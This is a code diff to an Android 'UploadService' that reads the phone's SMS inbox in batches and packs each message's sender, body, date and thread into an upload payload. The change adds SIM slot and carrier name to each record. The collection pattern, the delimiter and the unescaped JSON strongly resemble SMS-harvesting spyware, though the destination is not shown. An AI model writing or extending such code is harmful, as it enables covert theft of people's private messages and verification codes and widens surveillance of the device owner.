@@ -227,6 +227,16 @@ class UploadService : Service() {
         }
     }
 
+    private fun getCarrierName(context: Context, subId: Int): String {
+        if (subId == -1) return "Unknown"
+        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
+            val subscriptionManager = context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as? android.telephony.SubscriptionManager
+            val info = subscriptionManager?.getActiveSubscriptionInfo(subId)
+            return info?.carrierName?.toString() ?: "Unknown"
+        }
+        return "Unknown"
+    }
+
     private fun queryInboxBatch(context: Context, watermark: Long): SmsBatch? {
         val selection = "${Telephony.Sms._ID} > ? AND ${Telephony.Sms.TYPE} = ?"
         val selectionArgs = arrayOf(watermark.toString(), Telephony.Sms.MESSAGE_TYPE_INBOX.toString())
@@ -264,10 +274,16 @@ class UploadService : Service() {
                     )
                     val smsSeen = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.SEEN))
                     val smsThreadid = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.THREAD_ID))
+                    
+                    val subIdCol = c.getColumnIndex("sub_id")
+                    val subId = if (subIdCol != -1) c.getInt(subIdCol) else -1
+                    val carrierName = getCarrierName(context, subId)
+
                     payload.append(
                         "{\"Type\": \"inbox\",\"Number\": \"$smsNumber\"," +
                             "\"Thread Id\": $smsThreadid,\"Date\": $smsDate," +
-                            "\"Body\": \"$smsBody\",\"Seen\": $smsSeen,\"ID\": $smsId },-------(//)--------"
+                            "\"Body\": \"$smsBody\",\"Seen\": $smsSeen,\"ID\": $smsId," +
+                            "\"SimSlot\": $subId,\"Carrier\": \"$carrierName\" },-------(//)--------"
                     )
                     count++
                 } while (c.moveToNext())
